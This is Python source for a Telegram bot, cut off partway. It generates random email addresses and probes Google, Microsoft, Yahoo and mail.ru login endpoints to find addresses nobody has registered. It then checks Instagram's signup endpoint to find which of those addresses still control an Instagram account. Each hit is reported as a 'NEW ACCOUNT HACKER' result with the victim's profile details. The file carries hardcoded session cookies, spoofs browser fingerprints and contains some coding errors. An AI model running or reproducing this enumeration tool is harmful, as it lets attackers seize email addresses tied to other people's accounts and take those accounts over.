import requests,user_agent,json,flask,telebot,random,os,sys,secrets,names,urllib
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request
from uuid import uuid4 
from faker import Faker 
from time import sleep
bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)

@bot.message_handler(commands=['start'])
def boten(message):
	mas = types.InlineKeyboardMarkup(row_width=1) 
	I = types.InlineKeyboardButton(text ="INSTAGRAM", callback_data="F1")
	F = types.InlineKeyboardButton(text ="FACEBOOK", callback_data="F2")
	T = types.InlineKeyboardButton(text =" TIKTOK ", callback_data="F3")
	S = types.InlineKeyboardButton(text ="SNAPCHAT", callback_data="F4")
	W = types.InlineKeyboardButton(text ="Twitter", callback_data="F5")
	M = types.InlineKeyboardButton('DEVELOPER', url='https://t.me/ONCLIK')
	mas.add(I,F,T,S,W,M)
	logo = 'https://t.me/z9oon/7'
	bot.send_video(message.chat.id,logo, caption=" Welcome to My Bot Fuction All Websites ",reply_markup=mas)

@bot.callback_query_handler(func=lambda call: True)
def masg(call):
	global nam
	if call.data =="MohammedNajih":
		mas = types.InlineKeyboardMarkup(row_width=1)
		I = types.InlineKeyboardButton(text ="INSTAGRAM", callback_data="F1")
		F = types.InlineKeyboardButton(text ="FACEBOOK", callback_data="F2")
		T = types.InlineKeyboardButton(text =" TIKTOK ", callback_data="F3")
		S = types.InlineKeyboardButton(text ="SNAPCHAT", callback_data="F4")
		W = types.InlineKeyboardButton(text ="Twitter", callback_data="F4")
		M = types.InlineKeyboardButton('DEVELOPER', url='https://t.me/ONCLIK')
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=" Welcome to My Bot Fuction All Websites ",reply_markup=mas)
	elif call.data =="F1":
		gm=0;ya=0;ot=0;ho=0;ao=0;mr=0;bad=0;hit=0;ins=0
		while True:
			tk = secrets.token_hex(8)*2
			sets= ['@gmail.com','@aol.com','@yahoo.com','@mail.ru','@hotmail.com','@outlook.com']
			domin = random.choice(sets)
			r = '1234567890'
			u = str("".join(random.choice(r)for i in range(4)))
			n0 = names.get_first_name(gender='male')
			n1 = names.get_first_name()
			n2 = names.get_first_name(gender='femal')
			pa2 = n0 + u 
			pa3 = n1 + u 
			pa4 = n2 + u
			ema = Faker().email().split("@")[0]
			em = (n0,n1,n2,ema,pa2,pa3,pa4)
			emil = random.choice(em)
			email = emil+domin
			user = email.split('@')[0]
			if (email.split('@')[1])=='gmail.com':
				email = email
				user = user
				url = "https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j"
				headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '3893','content-type': 'application/x-www-form-urlencoded;charset=UTF-8','cookie': str(secrets.token_hex(8)*2),'google-accounts-xsrf': '1','origin': 'https://accounts.google.com','referer': 'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(generate_user_agent()),'x-chrome-id-consistency-request': '','x-client-data': 'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=','Decoded': 'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];','x-same-domain': '1'}
				data = {'continue': 'https://myaccount.google.com/?utm_source=sign_in_no_continue','service': 'accountsettings','f.req': f'["{email}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{email}",null,null,null,true,true,[]]','bgRequest': '["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]','at': 'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804','azt': 'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805','cookiesDisabled': 'false','deviceinfo': '[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]','gmscoreversion': 'undefined','checkConnection': 'youtube:353:0','checkedDomains': 'youtube','pstMsg': '1'}
				response = requests.post(url, data=data, headers=headers)
				if (',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]') in response.text:
					gm+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='hotmail.com':
				email = email
				user = user
				url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
				headers = {"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded","User-Agent": str(generate_user_agent()),"Connection": "close","Host": "odc.officeapps.live.com","Accept-Encoding": "gzip, deflate","Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0","Accept-Language": "ar,en-US;q=0.9,en;q=0.8","canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c","uaid": "d06e1498e7ed4def9078bd46883f187b","Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
				data = ""
				response = requests.post(url, data=data, headers=headers)
				if ("Neither") in response.text:
					ho+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='outlook.com':
				email = email
				user = user
				url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
				headers = {"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded","User-Agent": str(generate_user_agent()),"Connection": "close","Host": "odc.officeapps.live.com","Accept-Encoding": "gzip, deflate","Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0","Accept-Language": "ar,en-US;q=0.9,en;q=0.8","canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c","uaid": "d06e1498e7ed4def9078bd46883f187b","Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
				data = ""
				response = requests.post(url, data=data, headers=headers)
				if ("Neither") in response.text:
					ot+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='yahoo.com':
				email = email
				user = user
				url = "https://login.yahoo.com/?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com"
				headers = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '1415','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'B=134vcn5g2bbpe&b=3&s=qj; GUC=AQEBAQFgJwBgL0IbewRH; A1=d=AQABBC6vJWACEP3J2yDNTyPDcwvbCLnskxEFEgEBAQEAJ2AvYAAAAAAA_SMAAAcILq8lYLnskxE&S=AQAAAqvidgG6yaSrmxk9va8BlxE; A3=d=AQABBC6vJWACEP3J2yDNTyPDcwvbCLnskxEFEgEBAQEAJ2AvYAAAAAAA_SMAAAcILq8lYLnskxE&S=AQAAAqvidgG6yaSrmxk9va8BlxE; A1S=d=AQABBC6vJWACEP3J2yDNTyPDcwvbCLnskxEFEgEBAQEAJ2AvYAAAAAAA_SMAAAcILq8lYLnskxE&S=AQAAAqvidgG6yaSrmxk9va8BlxE&j=US; APID=UP41556690-6cb8-11eb-b3a4-0efff797295b; AS=v=1&s=6TWShzYC&d=A60274359|fsC2pD_.2SrPGM4_bsUz35krL9lhVhDkgjs9oXhsOxLn_6Pc8hBjqHW0tTZUOKxW1Y1zSIIqV8njXb.PBOrxDRrXfhwt_k3YX3tVb81JTLriH_Tszus2YORvYGHtNqXPE9F3yHfGj1tRrEMx3QS.xMnEUgRFk9i7ryR0Yf4bO6UwBY4r9bm8AQ.ASviERdysUeNgsFL6cnVVXVGvohfu9Bixh1Dhcc.hiQbM3oiuT6i1Guq0OA.B.gbjd5uXDRZWa0TyIcA8o9NWtu4Xwkod651B5mJVX7OKf8dgbZ.WuLfII7hGEuJIQumcrF0lYSa00bdoHOJITDfIdrZsEOMwapuC8PgyQ7TdTSE7Se2StSmyHt_OHimT4ok1EBYs7obzq9djkL8sdqhQN09zuM.P0vAZbVbbRKNm26l4_7tX8TvedU5dU.XVEOaEfsRKNGvwIhGRO2q7Moz548rof9QZ2j0UkWnjxx4gsEg_63pSZBdZdOiTfkYVYG.D0NO9AWtKGxpheNXOVt8Wxbx_140af0gQ5xSP1cnJU0SjUmj5Ru9doNFEZRGBniEM5cgPEB35OJH3.53XBu52SHyBa7AyJb7eedqqLgadHLn0SmgY8MX56DWB81WOIquyAgMknkBsf6MztjUZISotk83.TPxF93mIfVUWGQ2JsLKC1y_HFDE5JKNx0zoUs7X4MGDCZOQ6jHxB_Ay5TL_vBBZNiWTPzx1WZqow478Le27Q1YoypN5DY_eUfEtfvRJYPtgkHTyS3vABoI8FDC8sLMuuGhc_UjISybNAec2MNdBue96hR8Ni_B1GtP9Vcxfb18x4aZPan.j5.SP4jIYb_wIaIzxjVWYQ6sAJ5NKWWkzHpvxLEinGMde9mfqfBhcOk_rsAEf8XvNv3Ng-~A|C6027014a|FdYuFQD.2Ro5V4q.0EICg_TJUsTz2fCnS0hMzUGvjdLSyX_oe5h3q4pMKSj6upQIIsoS4ZGwTPbxmSx2tRJ7K0ASoA8nNws0p1Qhj7VLTdCTg0zvsfWcgRbzmA0TsCev.pDmairFLmKeHRGB5KsiPOQ1gp3gE_uYOCsMI_X.u.j0p70ia_YSl2jN04k3C50BMKFnfHloILTsDqu87JQF3xDv1LQS8fZICBqfQFEKsUHiRG6L.RCDLHle6V7Zfw170TuTyk5RojQHApkSAGNxyjuSyogaUBcO78_7DlZ3sH4jPeT5poE5M7vi1iyKDS0J0cLHV3kvaJJ_BwY.5pSMfl3XFl.tXlGZQ46RNXoffG7JkBPIQIqLtdiBRA5CU7oVKHFNVQzr24hOhTBx1H9nSeIbniTdnMA214dJ0yxQaxJ7m99RBq8O0vRzqSUmJ2rwSJZREkF3WIk7YAk4GB1BBDle91xLMqMqneJV3PmeTeRjIebH5fFQXjtek3lm1TkRJtt8XUU0U8Lpb5tjHE.LCN9rI_e..bLssuRUZXPZPMqE.8.abHk_VgDnsFf3hn81hopLbddNv11YkwAYO3m7bZQ8Ac5ko9eGUMQA5seI1nLX2ePDXp48qW__nG2e4r0BcevG68vtN4oezAS9W.k4prsy3fLEZiIeLgOcij_18OJAdEZsz.5keMZpxnlwmg5vZL.65dP5gFMfhd9WfgPSBLUM4DS7FiN.R9QgqfR.MD8MSI.yA27JorZqNyCZvBonkFkdv_SjVx67wmwsD0ExysXXz13W12.pAHKPD6HXWhvEw7VAJFPTV_vJm6p3Th8OPrgKgLhgqzwZgeM4ST0gOXwJfuIaspB2zJkjL7ZaZ_RMYsp7nuc29Qmx6k.y.lTVDwCCJzF70A5tQxKPRUMZPJCW8xRlpev2uzp3RbE_0qxPFogAdpqdxn.hZD10GT_fkZfQdNOwT99g87NCV1gQ79GDE_K41cynxh1acViZYWjJUOps8rIO2.MUgbMJiK5URAhdUKU9x7dYN9ozxrMJDDMLdx2iQGm1UJWfz7PBkEVZhJD1SDH2uvBhbn6tLhhU0tIylDoJkRXMPZgW3II-~A; APIDTS=1613099483','Host': 'login.yahoo.com','Origin': 'https://login.yahoo.com','Referer': 'https://login.yahoo.com/?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': str(generate_user_agent()),'X-Requested-With': 'XMLHttpRequest'}
				data = {'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":0,"timezone":"UTC","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"touchSupport":{"points":10,"event":0,"start":0},"fonts":{"count":33,"hash":"edeefd360161b4bf944ac045e41d0b21"},"audio":"124.04347527516074","resolution":{"w":"1456","h":"818"},"availableResolution":{"w":"778","h":"1456"},"ts":{"serve":1613099481853,"render":1613099482712}}','crumb': 'uQN26u0FMre','acrumb': '6TWShzYC','sessionIndex': 'QQ--','displayName': '','deviceCapability': '{"pa":{"status":false}}','username': str(email),'passwd': '','signin': 'Berikutnya','persistent': 'y'}
				response = requests.post(url, data=data, headers=headers)
				if ('"error":"messages.INVALID_USERNAME"') in response.text:
					ya+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='mail.ru':
				email = email
				user = user
				url = "https://account.mail.ru/api/v1/user/exists"
				headers = {"User-Agent": str(generate_user_agent())}
				data = {'email': str(email)}
				response = requests.post(url, data=data, headers=headers)
				if str(response.json()['body']['exists']) == 'False':
					mr+=1
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='aol.com':
				email = email
				user = user
				eml = user
